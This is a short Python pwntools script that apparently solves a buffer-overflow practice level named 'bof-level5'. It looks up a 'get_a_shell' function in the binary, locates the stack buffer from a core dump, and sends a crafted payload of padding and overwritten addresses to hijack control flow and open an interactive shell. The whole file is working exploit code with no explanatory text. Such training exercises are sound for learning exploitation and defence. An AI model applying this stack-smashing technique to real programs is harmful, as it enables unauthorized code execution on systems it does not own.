#!/usr/bin/env python

from pwn import *

#define our process
p = process("./bof-level5")

e = ELF('bof-level5')
shellHex = e.symbols['get_a_shell']
print(hex(shellHex))
print(shellHex)

buff = "A" * 132

#p.sendline(buff)
c = Core("./core")

buffer_address = c.stack.find(buff)
print(hex(buffer_address))
print(buffer_address)

#build up buffer with address one address passed beginning and starting address of buffer at the end to replace esp
buff = "A" * 4
buff += p32(shellHex) # address of get a shell
buff += "A" * 120
buff += p32(buffer_address) # address of buffer

print(p.recv())
p.sendline(buff)

p.interactive()
